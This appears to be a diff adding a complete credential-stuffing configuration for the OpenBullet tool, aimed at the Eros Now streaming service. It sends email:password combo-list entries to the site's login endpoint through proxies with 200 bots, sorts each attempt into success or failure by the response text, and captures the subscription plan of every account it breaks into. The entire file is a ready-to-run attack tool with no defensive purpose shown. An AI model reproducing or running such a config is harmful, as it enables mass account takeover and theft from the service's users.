@@ -1,0 +1,42 @@
+[SETTINGS]
+{
+  "Name": "Eros NOw + Capture",
+  "SuggestedBots": 200,
+  "LastModified": "2019-04-26T11:21:49.8405842+05:30",
+  "AdditionalInfo": "",
+  "Author": "GiftIsGood",
+  "Version": "1.0.2",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://erosnow.com/secured/dologin" 
+  CONTENT "el=<USER>&pw=<PASS>&mobile=&callingcode=&type=json&fbid=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The user name or password do not match our records. Please enter them again." 
+  KEYCHAIN Success OR 
+    KEY "\"login\",\"success\"" 
+
+PARSE "<SOURCE>" LR "\"plan\":" ",\"country_code" -> CAP "Subscription" 
+
